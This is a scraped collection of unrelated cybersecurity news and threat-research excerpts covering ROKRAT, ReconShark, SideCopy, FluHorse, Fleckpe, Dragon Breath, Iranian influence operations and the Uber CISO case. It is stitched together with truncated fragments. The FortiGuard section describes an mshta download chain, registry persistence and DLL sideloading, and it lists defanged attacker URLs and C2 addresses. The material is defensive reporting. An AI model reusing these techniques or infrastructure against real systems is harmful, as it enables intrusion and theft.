threat actor APT37. We discuss several different infection chains, most of which result in a ROKRAT payload. These infection chains show that since 2022, this group has stopped heavily relying on malicious documents to deliver malware and instead begun to hide payloads inside oversized LNK files. This method can trigger an equally effective infection chain by a simple double click, one that is more reliable than n-day exploits or the Office macros which require additional clicks to launch.Although we found that ROKRAT has not changed a lot recently, we see that the loaders being used to deploy it have indeed changed, shifting to the LNK method. In fact, this is the first time we saw ROKRAT delivered with an LNK infection chain, similar to the one used to deploy GOLDBACKDOOR. It is important to note that this does not mean APT37 no longer uses malicious documents, as we found evidence of such use as recently as April 2023.We also analyzed several newer samples of ROKRAT and described the commands that it accepts, which helps us shed some light on the malware’s internal mechanisms and capabilities. Check Point Research continues to track this tool, which is imperative as APT37 is still using it while also continuing to alter the infection chains.This report, together with other recent reports on ROKRAT versions for Android and macOS, shows that APT37 continues to pose a considerable threat, launching multiple campaigns across the platforms and significantly improving its malware delivery methods.Check Point Customers remain protected:TE Protections:Trojan.Wins.SusLNK.ATrojan.Wins.SusLNK.BInjector.Win.RemoteThread.ATechnique.Win.MalOfficeVBA.la.DExploit.Win.MalChildren.la.AHEP Protections:Technique.Win.EmbedExeLnk.ATechnique.Win.EmbedExeLnk.BSubscribe for cpr blogs, news and more© 1994- Check Point Software Technologies LTD.

      "title": "Kimsuky Evolves Reconnaissance Capabilities in New Global Campaign - SentinelOne",
      "text": " By Tom Hegel and Aleksandar MilenkoskiHistorically, Kimsuky targets have been located across countries in North America, Asia, and Europe. In the groups latest campaigns, they continue their global targeting themed around various ongoing geopolitical topics. For example, the latest Kimsuky campaigns have focused on nuclear agendas between China and North Korea, relevant to the ongoing war between Russia and Ukraine.For the deployment of ReconShark, Kimsuky continues to make use of specially crafted phishing emails. Notably, the spear-phishing emails are made with a level of design quality tuned for specific individuals, increasing the likelihood of opening by the target. This includes proper formatting, grammar, and visual clues, appearing legitimate to unsuspecting users. Notably, the targeted emails, which contain links to download malicious documents, and the malicious documents themselves, abuse the names of real individuals whose expertise is relevant to the lure subject such as Political Scientists.In the malicious emails, Kimsuky entices the target to open a link to download a password-protected document. Most recently, they made use of Microsoft OneDrive to host the malicious document for download. For example, as used against KRG, the lure email contained the OneDrive shared file link:The file downloaded is a password protected .doc file named “Research Proposal-Haowen Song.doc” (SHA1: 86a025e282495584eabece67e4e2a43dca28e505) which contains a malicious macro (SHA1: c8f54cb73c240a1904030eb36bb2baa7db6aeb01)The ability of ReconShark to exfiltrate valuable information, such as deployed detection mechanisms and hardware information, indicates that ReconShark is part of a Kimsuky-orchestrated reconnaissance operation that enables subsequent precision attacks, possibly involving malware specifically tailored to evade defenses and exploit platform weaknesses.The main responsibility of ReconShark is to exfiltrate information about the infected platform, such as running processes, information about the battery connected to the system, and deployed endpoint threat detection mechanisms.Similar to previous BabyShark variants, ReconShark relies on Windows Management Instrumentation (WMI) to query process and battery information.ReconShark checks for the presence of a broad set of processes associated with detection mechanisms, such as ntrtscan.exe (Trend Micro OfficeScan), mbam.exe (Malwarebytes Anti-Malware), NortonSecurity.exe (Norton Security), and avpui.exe (Kaspersky Internet Security).In contrast to previous BabyShark variants, ReconShark exfiltrates information without first storing it on the filesystem – the malware stores the information it collects in string variables and then uploads them to the C2 server by issuing HTTP POST requests.In addition to exfiltrating information, ReconShark deploys further payloads in a multi-stage manner that are implemented as scripts (VBS, HTA, and Windows Batch), macro-enabled Microsoft Office templates, or Windows DLL files. ReconShark decides what payloads to deploy depending on what detection mechanism processes run on infected machines.Some ReconShark strings are encrypted using a relatively simple cipher to evade static detection mechanisms. These strings are typically commands or scripts for downloading and/or executing payloads.ReconShark deploys and executes payloads in different ways. For example, the malware can directly download a payload from the C2 server using the curl utility, but also use Windows Shortcut (LNK files) or Office templates for that purpose.ReconShark edits Windows Shortcuts (LNK files) to the msedge.exe (Microsoft Edge), chrome.exe (Google Chrome), outlook.exe (Office Outlook), whale.exe (Whale browser), and firefox.exe (Mozilla Firefox) applications. When executed, these LNK files start the linked legitimate applications and execute malicious code at the same time.Further, ReconShark replaces the default %AppData%\\Microsoft\\Templates\\Normal.dotm Office template, which opens whenever a user starts Microsoft Word, with a malicious Office template hosted at the C2 server. This effectively compromises the execution of Microsoft Word.\nReconShark edits LNK files (top) and deploys a malicious Normal.dotm Office template (bottom)The payload staging ends with Windows Batch or VBS scripts that create the %AppData%\\1 file with a content of ss or sss. These files may represent markers of a successful ReconShark execution.All observed infrastructure in this campaign are hosted on a shared hosting server from NameCheap, whom we’ve already notified of this malicious activity and recommended takedowns. Kimsuky operators continually made use of LiteSpeed Web Server (LSWS) for managing the malicious functionality.Phishing emails have been observed sending from the yonsei[.]lol domain, while rfa[.]ink and mitmail[.]tech are used for command and control. The domain yonsei[.]lol has been active since December 2022, with malicious activity occurring as recently as this week. rfa[.]ink has been actively used since early February 2023, and mitmail[.]tech since mid January 2023. Kimsuky also made use of newshare[.]online as a C2 server for a short time at the end of 2022.As shown in the ReconShark macro example, beacons are made to the /bio/ directory of rfa[.]ink. During our analysis of the activity, the attacker made multiple attempts at renaming that directory, including /bio433ertgd12/ then later /bio234567890rtyui/, and a day later returning back to /bio/. This may have been an attempt to hinder research efforts, or pause the intake of new victims for unknown reasons. The IOC table below highlights each of the URL paths Kimsuky manages across each C2 domain and their specific purpose according to the execution flow in the macro. These patterns match across domains, while the directory they are placed in often varies. Attempted navigation to some paths on C2 domains are configured to redirect visitors to the legitimate Microsoft website.The ongoing attacks from Kimsuky and their use of the new reconnaissance tool, ReconShark, highlight the evolving nature of the North Korean threat landscape. Organizations and individuals need to be aware of the TTPs used by North Korea state-sponsored APTs and take necessary precautions to protect themselves against such attacks. The link between recent activity and a wider set of previously unknown activity attributed to North Korea underscores the need for continued vigilance and collaboration.Get notified when we post new content.Thanks!

Clients should be concerned about the security stance of their MSPs and understand the threats they face, lest a compromise of their provider leads to a compromise of themselves.\n      Sign up for our newsletters\n    Digital Security20 scary cybersecurity facts and figures for a haunting HalloweenDigital Security20 scary cybersecurity facts and figures for a haunting Halloween • Digital SecurityOne login to rule them all: Should you sign in with Google or Facebook on other websites?Digital SecurityOne login to rule them all: Should you sign in with Google or Facebook on other websites? • Digital SecurityVirus Bulletin PUA – a love letterDigital SecurityVirus Bulletin PUA – a love letter • \n            Award-winning news, views, and insight from the ESET security community\n          "

      "title": "Clean Rooms, Nuclear Missiles, and SideCopy, Oh My! | FortiGuard Labs ",
      "text": " FortiGuard Labs Threat ResearchAffected Platforms: Windows\nImpacted Users: Windows users\nImpact: Controls victim’s machine and collects sensitive information\nSeverity Level: Medium\nOccasionally, FortiGuard Labs researchers come across a file name or e-mail subject that makes us sit up and take notice. Of course, it may turn out to be nothing. But every once in a while, one of these turns out to be incredibly interesting.We recently came across one such file that referenced an Indian state military research organization and an in-development nuclear missile. The file was meant to deploy malware with characteristics matching the APT group “SideCopy.” With activities dating back to at least 2019, this group has aligned its targeting with the goals and objectives of the Pakistani government.The SideCopy APT group is known to leverage similar TTPs (Tactics, Techniques, and Procedures)—and in some cases, utilizes the same infrastructures—as another Pakistan-based threat actor group known as “Transparent Tribe.” Some reports even claim that SideCopy is a subsidiary of Transparent Tribe. The group was allegedly named “SideCopy” because an infection chain they employed was copied from the long-time Indian threat actor group SideWinder in a likely attempt to make attribution more difficult. Although SideCopy primarily targets Windows platforms, some reports indicate they have deployed malware to compromised Mac and Linux machines.The initial infection vector is suspected to be a phishing e-mail. However, that information was not available to FortiGuard Labs at the time of our investigation. That said, we do have access to a Zip file that would have been the likely attachment to an e-mail.The Zip file contains three files, with two of them meant to be deployed in a subdirectory of the extraction location. The “office.template.mac” and “office.template.ui” files appear to contain unformatted data and have no bearing on the infection chain. They seem to function as decoys to make the third file, “DRDO-K4 Missile Clean room.pptx.lnk”, appear more legitimate.This is a Microsoft Windows shortcut file. On any Windows system with file extensions hidden, the “.lnk” extension would not be visible, making it appear as “DRDO-K4 Missile Clean room.pptx”. This deception makes it more difficult to distinguish the file as malicious simply by looking at it.The Windows shortcut file does not open a PowerPoint file (at least immediately). Instead, it reaches out to a domain controlled by the attacker using the utility for Microsoft HTML Applications (HTAs), or “mshta.exe”.In this case, the command line argument points to a URL. At the other end of the URL is a malicious file, “Pantomime.hta”, that will be downloaded and executed:hXXp://cornerstonebeverly[.]org/js/files/docufentososo/doecumentosoneso/pantomime[.]hta.“Pantomime.hta” contains several sections of note. The head of the file validates the .Net version installed on the victim machine and verifies whether the folder “C:\\ProgramData\\HP” is present. If not, it will create it.Most of the rest of the file is dominated by two encoded sections stored in variables “dividAndRule” and “punctureTyres”. Both are base 64 encoded, albeit in slightly different ways.It’s helpful to start with the second section first, as it has to be read first for the code to be executed properly.As Figure 6 shows, “punctureTyres” is passed to the function “basforsixfourstream” (as shown in Figure 5), which decodes it from base64.The newly decoded “punctureTyres” is deserialized (read into a memory stream), where it can be executed.Contained within this stream is a Microsoft .Net library named “hta.dll”. It includes a function called “RealityShow” that is used to pass the base64-encoded variable “dividAndRule” so the file “DRDO-K4 Missile Clean room.pptx” can be deployed as well as the next stage of the malware.As mentioned, “hta.dll” aims to deploy “DRDO-K4 Missile Clean room.pptx”. It can be deployed as well as the next stage of the malware.After being called from “Pantomime.hta”, the function “openthefile” takes the data from “dividAndRule”, decodes it from base64, and decompresses it due to it being a GZip compressed data stream. It then opens the file for display.Additionally, the function “getThirdStrike” is called to begin the next phase of infection.“getThirdStrike” establishes the download location for what will become the file “jquery.hta”. It then sends that on the function “runItOn” to reach out to “hXXp://cornerstonebeverly[.]org/js/files/ntfonts/jquery.txt” to download the file.“getThirdStrike” also assesses the antivirus situation on the victim machine and passes that information on via an HTTP POST through the “pkg.infinity” function, which will reach out to “hXXp://cornerstonebeverly.org/js/files/ntfonts/avena/”.Once all of this occurs, the execution of “jquery.hta” commences.Unlike the shortcut that shares its name, this is an actual Microsoft PowerPoint file.\nThe PowerPoint deck contains 22 slides and is a convincing treatise on the requirements for building a cleanroom environment to suit the needs of a major aerospace project in that region of the globe. The file, however, is entirely benign and operates as a decoy to conceal other activities being undertaken.“jquery.hta” is very similar in structure and purpose to “Pantomime.hta”. It advances the infection by deploying additional files from multiple variables with encoded data. It seems to have also been created by SILENTTRINITY. The head of the file contains the function “decode_base64”, a custom implementation to decode base 64-encoded data that will be used later and a large, encoded section attached to a variable called “addle”. Like “Pantomime.hta”, this gets executed once the next section is decoded and executed.The variable “InMomemerandum” contains the base64-encoded data for another .Net DLL called “PreBot.dll”.The function “decode_base64” from Figure 12 is now being used to decode a small block of base64 text, “U2VsZWN0ICogRnJvbSBBbnRpVmlydXNQcm9kdWN0”. This translates to “Select * From AntiVirusProduct”, a Windows Management Instrumentation (WMI) query to obtain information on what type of antivirus product(s) may be installed on the system.Figure 14 shows that “InMomemerandum” will be sent to a function to decode it from base 64—in this case, the function “bazSixFerToStreeeemStranger”. It is then deserialized to run “PreBot.dll” in memory, after which point the data from the variable “addle” is passed to the function “PinkAgain”.The opening class declaration of “DraftingPad” contains the path destinations for the files remaining to be deployed for this attack.In addition to containing the desired landing locations for the remaining files, some additional base 64 encoded text is assigned to the variable “BatFileBytes”.The “PinkAgain” function takes the data passed from “jquery.hta” in the form of a base 64-encoded, GZip-compressed stream of bytes and the antivirus settings of the victim machine and route them to a function that will deal with them appropriately.\nThe purpose of “test.bat” is to create a registry key called “Windows Update Schedule” in the “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” registry hive. The naming convention attempts to assist it in blending in as something that looks legitimate.\nThis ensures that the file “C:\\Users\\Public\\hp\\cridviz.exe” is executed upon each system restart. Finally, “DUser.dll” is decompressed and deposited into its target location of “C:\\Users\\Public\\hp\\” alongside “cridviz.exe”. This contains the main code for a Remote Access Trojan (RAT) that will be used along with the aforementioned “credviz.exe” by having its code sideloaded (https://attack.mitre.org/techniques/T1574/002/) into it when it launches.The file “C:\\Users\\Public\\hp\\cridviz.exe” is copied from its usual location at either “C:\\Windows\\SysWOW64\\credwiz.exe” or “C:\\Windows\\System32\\credwiz.exe” (depending on the system’s architecture) to the above location with the filename slightly altered.“cridviz.exe” is the \"Credential Backup and Restore Wizard\" used as part of the Windows Credential Manager to provide a method for backing up and restoring saved credentials on the system.As mentioned previously, the SideCopy RAT doesn’t exist as a separate executable. It has to have assistance via another application to load its code into memory and execute it. In this case, it’s “cridviz.exe”. It uses sideloading to do this, which is to say that a dependency of the legitimate application is highjacked to allow the malicious code to load. This is done by dropping the malicious DLL “DUser.dll” in the directory with “cridviz.exe”.\nInterestingly, “DUser.dll” isn’t a direct dependency requirement. It is actually a requirement of two other libraries that “cridviz.exe” requires, “COMCTL32.dll” and “SHELL32.dll”. The result of doing this is that it makes tracing the source of the malicious code much more difficult.The end state for this attack is the deployment and execution of “DUser.dll”. As alluded to above, a legitimate version of this file normally resides in “C:\\Windows\\SysWOW64”.\nAs shown in Figure 23, comparing the illegitimate and legitimate files indicates several differences. Notably, what’s available in the “File description” and “File version” fields, as well as the size of the files, with the malicious one being considerably smaller.Upon execution, “DUser.dll” reaches out to “hXXp://144[.]91[.]72[.]17:8080” as a command and control (C2) node to both send and receive to.\nThe actions performed by the RAT use a distinctive user-agent string, “cpp-httplib/0.7”, making it stand out in traffic. It can communicate over TCP using raw sockets or via HTTP. The RAT can also perform other, less common HTTP verb-related operations, such as “PUT” and “PATCH”.The RAT can start other processes if instructed using the “CreateProcessW” Windows API call. This would be useful for launching additional payloads once a foothold on the target system has been achieved.\nA targeted campaign, where the attacker takes the time to create a lure relevant enough for a target to pursue, will always open more doors for an attacker. In this case, we saw SideCopy deliver one that would be of interest only to a small group of people in the Indian defense industry.Targets in this position would be of definite interest to the Government of Pakistan and any threat actors that align with its aims.Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows:The following (AV) signature detects the malware samples mentioned in this blogThe WebFiltering client blocks all network-based URIs.Fortinet has multiple solutions designed to help train users to understand and detect phishing threats:File-based IOCs:FilenameSHA256DRDO-K4-Missile-Clean-room.zip9aed0c5a047959ef38ec0555ccb647688c67557a6f8f60f691ab0ec096833cceoffice.template.macbf34077c8b22759b28dcc458dc1b7bba3810c1c30b050b26a26e8d9f64e77971office.template.uic7753ffb7f66b0dfb05a24955324182cb92bbf41dd8fccb308c3f04d497a16daDRDO - K4 Missile Clean room.pptx.lnka2e55cbd385971904abf619404be7ee8078ce9e3e46226d4d86d96ff31f6bb9apantomime.htae88835e21c431d00a9b465d2e8bed746b6369892e33be10bc7ebbda6e8185819hta.dll68ec4461653ae682eeace1bff583307ec521a3ee23873a991c031cc49dc8132fDRDO - K4 Missile Clean room.pptxb9514ed1566c8ce46ab5bfd665f8b997f2d5624740f298699df43bb108e08c4djquery.hta85faf414ed0ba9c58b9e7d4dc7388ba5597598c93b701d367d8382717fb485ecPreBot.dll1c2399674713d2a3fc19b841e979eed61d73d1b7ca8fd6f29ba95a41f5a7684dtest.batf0cc9b18ba32f95085d5f9a3539dc08832c19e7d3124a5febbdc3bae47deab24cridviz.exe17eabfb88a164aa95731f198bd69a7285cc7f64acd7c289062cd3979a4a2f5bfDUser.dll865e041b41b9c370a4eed91a9a407bd44a94e16e236e07be05e87de319a4486c Network-based IOCs:IOCIOC typecornerstonebeverly[.]orgTLD for HTA file downloadshXXp://cornerstonebeverly[.]org/js/files/docufentososo/doecumentosoneso/pantomime[.]htaFurther payload downloadhXXps://cornerstonebeverly[.]org/js/files/ntfonts/avena/C2hXXp://cornerstonebeverly[.]org/js/files/ntfonts/jquery[.]txtFurther payload downloadhXXp://144.91.72[.]17:8080/user_detailsC2hXXp://144.91.72[.]17:8080/streamcmd?AV=Unknown&OS=6.1.7601.17932&Vesrion=1&detail=Wfstzepn_AdminC2 Extracted PDB Paths:FilePathDUser.dllE:\\Packers\\CyberLink\\Latest Source\\Multithread Protocol Architecture\\HTTP Arsanel\\Clinet\\app\\Release\\app.pdb \n                    FortiGuard Labs Threat Research\n                \n                    FortiGuard Labs Threat Research\n                \n                    FortiGuard Labs Threat Research\n                Copyright © 2023 Fortinet, Inc.

      "text": "  Microsoft is warning that Iran is using a new set of preferred techniques that combine its traditional cyberattacks with cyber-enabled influence operations (IO) for greater geopolitical effect.Iran’s operations are primarily focused on Israel, with almost a quarter of its efforts (23%) focused on that specific Middle Eastern country between October and March, followed by the U.S., United Arab Emirates and Saudi Arabia. Some of its goals include seeking to bolster Palestinian resistance, fomenting unrest in Bahrain and countering the ongoing normalization of Arab-Israeli ties, Watts continued. Iran does this by adopting cyber-enabled IO to embarrass prominent opposition figures by using fake online personas to amplify or hype attacks.  While Iranian threat groups have increased their use of cyber-enabled IO, Microsoft noted a corresponding decline in their use of ransomware and wiper attacks.The blog post coincided with the release of Microsoft’s Threat Intelligence report on Iran’s cyber-enabled IO, which itself is part of the company’s semi-annual update on nation-state actors in an effort to inform its customers and the global community, Watts wrote.The report noted that Microsoft linked 24 influence operations to the Iranian government in 2022 compared with seven in 2021.Stephen Weigand is managing editor and production manager for SC Media.

      "title": "Judge Spares Former Uber CISO Jail Time Over 2016 Data Breach Charges",
      "text": " On May 4, a federal judge in California sentenced former Uber chief information security officer Joseph Sullivan to three years of probation for his role in covering up a 2016 data breach that exposed data on more than 50 million customers.Judge William Orrick of the US District Court for the Northern District of California also ordered Sullivan to pay a $50,000 fine and do 200 hours of community service.In handing down the sentence, Judge Orrick himself appears to have minced no words in making clear that other cybersecurity leaders would not be so fortunate if they ended up before him like Sullivan did.The second count on which the jury convicted Sullivan was for misprision of a felony, or for working to cover up the 2016 breach from others, including executives at Uber. Prosecutors said Sullivan did this by paying $100,000 to the two hackers responsible for the breach, to keep them from making it public. Sullivan, working with other members of his security team, arranged for the hackers to receive payment via Uber's official bug bounty program and then got the hackers to sign a supplemental nondisclosure agreement (NDA), in essence to buy their silence. To receive the money the hackers agreed that they had not accessed any sensitive data at Uber, when, in fact, they had.The bounty was the largest that Uber had ever paid researchers under its bug bounty program till that time. The supplemental NDA was also the first time that Uber had mandated such a requirement from bug hunters, prosecutors said in highlighting the lengths to which Sullivan went to conceal the breach. In their sentencing memorandum, prosecutors noted that Sullivan almost got away with his plan because knowledge of the FTC's investigation and of Uber's cybersecurity program existed within a silo at the company. Only a few people at the company knew of the significance of the breach, and had it not been for the arrival of a new CEO at Uber — Dara Khosrowshahi — in August 2017, the incident would have remained a secret, they noted.Uber itself did not participate in the trial, and neither did Kalanick.At the sentencing, Judge Orrick noted he had received 186 letters from Sullivan's peers, friends, and family —some arguing for leniency and others calling for prison time. One of the letters calling for a probation apparently was from Kalanick.\"Judge Orrick took into consideration the many letters in support of Mr. Sullivan's long-term contribution to the public and the information security field in particular,\" Avivi says. \"Judge Orrick did note that the former Uber CEO Travis Kalanick was 'just as culpable' as Joe Sullivan.\"Avivi says this is a good time for organizations to reaffirm the central role CISOs play in companies and to realize the cybersecurity buck stops with them. \"Also important is for the CISO to create and put in place a contingency plan before they get breached, to minimize the financial and operational fallout when they do.\"Christopher Hallenbeck, CISO, Americas at Tanium, says the key takeaway here is that breach response is a team sport that involves multiple executives. Not reporting a breach is bad enough, but hiding it is worse, he says.\"For various historical reasons, CISOs took on this task of keeping things quiet while trying to fix the issue themselves,\" Hallenbeck notes. \"If you're asked or pressured to act unethically or possibly illegally, be prepared to walk away and/or blow the whistle.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A new Android malware called 'FluHorse' has been discovered, targeting users in Eastern Asia with malicious apps that imitate legitimate versions.The malware was discovered by Check Point Research, which reports that it has been targeting various sectors of Eastern Asia since May 2022.The FluHorse malware is distributed via email, while its goal is to steal its target's account credentials and credit card data and, if needed, snatch two-factor authentication (2FA) codes.FluHorse attacks begin with malicious emails sent to high-profile targets, urging them to take immediate action to resolve a payment issue.Typically, the victim is led to a phishing site via a link provided in the email, where they download the fake app APK (Android package file) from.The apps mimicked by the FluHorse carrier apps are 'ETC,' a toll-collection app used in Taiwan, and 'VPBank Neo,' a banking app in Vietnam. Both legitimate versions of these apps have over a million downloads each on Google Play.Check Point has also observed the malware posing as a transportation app used by 100,000 people, but its name wasn't disclosed in the report.All three fake apps request SMS access upon installation to intercept incoming 2FA codes in case it's needed to hijack the accounts.The analysts comment that the fake apps copy the GUI of the originals but do not feature much functionality besides two-three windows that load the forms which capture the victim's information.After capturing the victims' account credentials and credit card details, the apps display a \"system is busy\" message for 10 minutes, likely to make the process appear realistic while the operators act in the background to intercept 2FA codes and leverage the stolen data.CheckPoint says that the malicious apps were built in Dart, using the Flutter platform, and reverse engineering and decompiling the malware was challenging.\"Which register is used as a stack pointer makes no difference in code execution or in the reverse-engineering process. However, it makes a big difference for the decompiler. Because of a non-standard register usage, a wrong and ugly pseudocode is generated.\"The analysis was so challenging that CheckPoint ended up contributing improvements to existing open-source tools like 'flutter-re-demo' and 'reFlutter.'Ultimately, this work revealed the functions responsible for exfiltrating victims' credentials, credit card data, and the HTTP POST communication that sent the intercepted SMS messages to the C2 server.CheckPoint warns that the FluHorse campaign is ongoing, with new infrastructure and malicious apps appearing each month, so this is an active threat for Android users."

      "text": " Freelance JournalistThe North Korean state-sponsored APT group known as Kimsuky has been observed using a new malware component called ReconShark.“The spear-phishing emails are made with a level of design quality tuned for specific individuals, increasing the likelihood of opening by the target. This includes proper formatting, grammar, and visual clues, appearing legitimate to unsuspecting users,” explained SentinelOne’s Tom Hegel and Aleksandar Milenkoski.“Notably, the targeted emails, which contain links to download malicious documents, and the malicious documents themselves, abuse the names of real individuals whose expertise is relevant to the lure subject such as political scientists.”The Microsoft Office macros are triggered when a document is closed and carry out a more advanced version of the reconnaissance function found in Kimsuky’s BabyShark malware. “The ability of ReconShark to exfiltrate valuable information, such as deployed detection mechanisms and hardware information, indicates that ReconShark is part of a Kimsuky-orchestrated reconnaissance operation that enables subsequent precision attacks, possibly involving malware specifically tailored to evade defenses and exploit platform weaknesses,” reads the advisory.ReconShark, unlike previous variants, does not save gathered information on the file system. Instead, the malware keeps the data in string variables and sends it to a command-and-control (C2) server via HTTP POST requests. ReconShark can also install additional payloads, such as scripts or DLL files, based on the detection mechanism processes found on the infected machines.Hegel and Milenkoski further explained that the group’s recent campaigns focused on global issues and targeted audiences worldwide.The SentinelOne team recently noticed a campaign targeting Korea Risk Group (KRG) employees. KRG is a firm that specializes in analyzing matters that have a direct or indirect impact on the Democratic People’s Republic of Korea (DPRK).“Our assessment is that the same campaign has been used to continue targeting other organizations and individuals in at least the United States, Europe, and Asia, including think tanks, research universities, and government entities,” Hegel and Milenkoski warned."

However, it's obvious that U.S. law enforcement agencies are determined to shut down Z-Library and find the people running it.Z-Library provides free access to a vast database of almost 12 million books and 84 million articles, making it one of the most popular websites on the internet."

      "text": " The North Korean Kimsuky hacking group has been observed employing a new version of its reconnaissance malware, now called 'ReconShark,' in a cyberespionage campaign with a global reach.Sentinel Labs reports that the threat actor has expanded its targeting scope, now targeting government organizations, research centers, universities, and think tanks in the United States, Europe, and Asia.Kimsuky leverages well-crafted and personalized spear-phishing emails to infect its targets with the ReconShark malware, a tactic seen in all previous campaigns of the threat group.These emails contain a link to a malicious password-protected document hosted on Microsoft OneDrive to minimize the chances of raising any alarms on email security tools.When the target opens the downloaded document and enables macros as instructed, the embedded ReconShark malware is activated.\"The attackers are likely looking for easy wins against outdated versions of Office or simply users enabling macros,\" Tom Hegel, Sr. Threat Researcher at SentinelLabs, told BleepingComputer.\"Kimsuky is not being too innovative here -- especially since they are still evolving the BabyShark malware family.\"ReconShark abuses WMI to collect information about the infected system, like the running processes, battery data, etc.It also checks if security software runs on the machine, with Sentinel Labs mentioning specific checks for Kaspersky, Malwarebytes, Trend Micro, and Norton Security products.The exfiltration of the reconnaissance data is direct, with the malware sending everything to the C2 server via HTTP POST requests without storing anything locally.\"The ability of ReconShark to exfiltrate valuable information, such as deployed detection mechanisms and hardware information, indicates that ReconShark is part of a Kimsuky-orchestrated reconnaissance operation that enables subsequent precision attacks, possibly involving malware specifically tailored to evade defenses and exploit platform weaknesses,\" warned SentinelOne.Another capability of ReconShark is to fetch additional payloads from the C2, which can give Kimsuky a better foothold on the infected system.\"ReconShark decides what payloads to deploy depending on what detection mechanism processes run on infected machines.\"The payload deployment stage involves editing Windows shortcut files (LNK) associated with popular applications like Chrome, Outlook, Firefox, or Edge to execute the malware when the user launches one of those apps.An alternative method is to replace the default Microsoft Office template, Normal.dotm, with a malicious version hosted on the C2 server to load malicious code whenever the user launches Microsoft Word.Both techniques offer a stealthy way to infiltrate deeper into the targeted system, maintain persistence, and execute additional payloads or commands as part of the threat actor's multi-stage attack.Kimsuky's level of sophistication and shape-shifting tactics blur the line that separates its operation from other North Korean groups that conduct broader campaigns, and call for heightened vigilance."

      "text": " A new Android subscription malware named 'Fleckpe' has been spotted on Google Play, the official Android app store, disguised as legitimate apps downloaded over 620,000 times.Threat actors make money from unauthorized subscriptions by receiving a share of the monthly or one-time subscription fees generated through the premium services. When the threat actors operate the services, they keep the entire revenue.Kaspersky's data suggests that the trojan has been active since last year but was only recently discovered and documented.Most victims of Fleckpe reside in Thailand, Malaysia, Indonesia, Singapore, and Poland, but a smaller number of infections are to be found across the globe.Kaspersky discovered 11 Fleckpe trojan apps impersonating image editors, photo libraries, premium wallpapers, and more on Google Play, distributed under the following names:Android users who have previously installed the apps listed above are advised to remove them immediately and run an AV scan to uproot any remnants of malicious code still hidden in the device.Upon installation, the malicious app requests access to notification content required to capture subscription confirmation codes on many premium services.When a Fleckpe app launches, it decodes a hidden payload that contains malicious code, which is then executed.This payload is responsible for contacting the threat actor's command and control (C2) server to send basic information about the newly infected device, including the MCC (Mobile Country Code) and MNC (Mobile Network Code).The C2 responds with a website address which the trojan opens in an invisible web browser window and subscribes the victim to a premium service.If a confirmation code needs to be entered, the malware will retrieve it from the device's notifications and submit it on the hidden screen to finalize the subscription.The app's foreground still offers victims the promised functionality, hiding their real purpose and reducing the likelihood of raising suspicions.In the latest versions of Fleckpe analyzed by Kaspersky, developers have shifted most of the subscription code from the payload to the native library, leaving the payload responsible for intercepting notifications and displaying web pages.Additionally, a layer of obfuscation has been incorporated into the most recent payload version.Kaspersky believes the malware's creators implemented these modifications to increase Fleckpe's evasiveness and make it more challenging to analyze.While not as dangerous as spyware or data-stealing malware, subscription trojans can still incur unauthorized charges, collect sensitive information about the user of the infected device, nd potentially serve as entry points for more potent payloads.To protect against these threats, Android users are advised to only download apps from trusted sources and developers and pay attention to the requested permissions during installation."

      "text": " An APT hacking group known as \"Dragon Breath,\" \"Golden Eye Dog,\" or \"APT-Q-27\" is demonstrating a new trend of using several complex variations of the classic DLL sideloading technique to evade detection.These attack variations begin with an initial vector that leverages a clean application, most often Telegram, that sideloads a second-stage payload, sometimes also clean, which in turn, sideloads a malicious malware loader DLL.The lure for victims is trojanized Telegram, LetsVPN, or WhatsApp apps for Android, iOS, or Windows that have been supposedly localized for people in China. The trojanized apps are believed to be promoted using BlackSEO or malvertizing.DLL sideloading is a technique exploited by attackers since 2010, taking advantage of the insecure way Windows loads DLL (Dynamic Link Library) files required by an application.The attacker places a malicious DLL with the same name as the legitimate, required DLL in an application's directory. When the user launches the executable, Windows prioritizes the local malicious DLL over the one in the system folders.The attacker's DLL contains malicious code that loads at this stage, giving the attacker privileges or running commands on the host by exploiting the trusted, signed application that is loading it.In this campaign, the victims execute the installer of the mentioned apps, which drops components on the system and creates a desktop shortcut and a system startup entry.If the victim attempts to launch the newly created desktop shortcut, which is the expected first step, instead of launching the app, the following command is executed on the system.The command runs a renamed version of 'regsvr32.exe' ('appR.exe') to execute a renamed version of 'scrobj.dll' ('appR.dll') and supplies a DAT file ('appR.dat') as input to it. The DAT contains JavaScript code for execution by the script execution engine library ('appR.dll').The JavaScript code launches the Telegram app user interface in the foreground while installing various sideloading components in the background.Next, the installer loads a second-stage application using a clean dependency ('libexpat.dll') to load a second clean application as an intermediate attack stage.In one variation of the attack, the clean application \"XLGame.exe\" is renamed to \"Application.exe,\" and the second-stage loader is also a clean executable, signed by Beijing Baidu Netcom Science and Technology Co., Ltd.In another variation, the second-stage clean loader is \"KingdomTwoCrowns.exe,\" which is not digitally signed, and Sophos couldn't determine what advantage it offers besides obfuscating the execution chain.In a third variation of the attack, the second-stage loader is the clean executable \"d3dim9.exe,\" digitally signed by HP Inc.This \"double DLL sideloading\" technique achieves evasion, obfuscation, and persistence, making it harder for defenders to adjust to specific attack patterns and effectively shield their networks.In all observed attack variations, the final payload DLL is decrypted from a txt file ('templateX.txt') and executed on the system.This payload is a backdoor that supports several commands, such as system reboot, registry key modification, fetching files, stealing clipboard content, executing commands on a hidden CMD window, and more.The backdoor also targets the MetaMask cryptocurrency wallet Chrome extension, aiming to steal digital assets from victims.In summary, DLL sideloading remains an effective attack method for hackers and one that Microsoft and developers have failed to address for over a decade.In the latest APT-Q-27 attack, analysts observed DLL sideloading variations that are challenging to track; hence they achieve a stealthier infection chain."

